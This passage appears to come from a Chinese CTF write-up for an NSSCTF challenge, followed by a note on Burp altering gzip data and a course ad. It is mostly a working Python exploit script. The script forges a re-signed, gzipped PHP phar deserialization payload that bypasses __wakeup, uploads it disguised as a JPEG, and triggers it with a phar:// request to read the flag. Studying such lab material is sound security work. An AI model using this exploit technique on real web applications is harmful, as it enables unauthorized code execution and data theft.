
```python
import requests
from hashlib import sha1
import gzip
import re

def getPhar():
    with open('phar.phar', 'rb') as file:
        f = file.read()
        s = f[:-28] # 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）
        s = s.replace(b'3:{', b'4:{') # 绕过__wakeup
        h = f[-8:] # 获取签名类型以及GBMB标识，各4个字节
        newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)
        return gzip.compress(newf) # 进行gzip压缩

def upload(file):
    burp0_url = "956K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1I4y4q4)9J5k6e0M7I4i4K6u0W2x3U0f1@1i4K6y4m8x3U0R3@1x3o6y4Q4x3V1k6#2M7r3I4G2j5h3c8Q4x3X3g2H3K9s2l9."
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "07fK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1I4y4q4)9J5k6e0M7I4i4K6u0W2x3U0f1@1i4K6y4m8x3U0R3@1x3o6x3.", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfXBfemuGHEVNBhN8", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "25aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1I4y4q4)9J5k6e0M7I4i4K6u0W2x3U0f1@1i4K6y4m8x3U0R3@1x3o6y4Q4x3V1j5.", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = b"------WebKitFormBoundaryfXBfemuGHEVNBhN8\r\nContent-Disposition: form-data; name=\"file\"; filename=\"phar.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n" + file + b"\r\n------WebKitFormBoundaryfXBfemuGHEVNBhN8\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n------WebKitFormBoundaryfXBfemuGHEVNBhN8--\r\n"
    # 注意数据类型为byte类型，应该file为byte类型，相同数据类型才能合并
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

def getFlag():
    burp0_url = "7dbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1I4y4q4)9J5k6e0M7I4i4K6u0W2x3U0f1@1i4K6y4m8x3U0R3@1x3o6y4Q4x3V1j5."
    burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Origin": "b27K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1I4y4q4)9J5k6e0M7I4i4K6u0W2x3U0f1@1i4K6y4m8x3U0R3@1x3o6x3.", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "216K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0q4Q4x3X3f1I4y4q4)9J5k6e0M7I4i4K6u0W2x3U0f1@1i4K6y4m8x3U0R3@1x3o6y4Q4x3V1j5.", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"file": "phar://./upload/phar.jpg/test.txt", "submit": ''}
    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return re.findall('(NSSCTF\{.*?\})', res.text)[0]

if __name__ == '__main__':
    upload(getPhar())
    print(getFlag())
```

运行得到flag

![图片描述](https://bbs.kanxue.com/upload/attach/202209/952339_VSBW6D5DJQ23EM3.png)

ps：注意如果用`burp`代理抓包上传`gzip`压缩后的`phar`可能会有bug，`burp`会改变`gzip`数据，导致无法识别`phar`文件

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
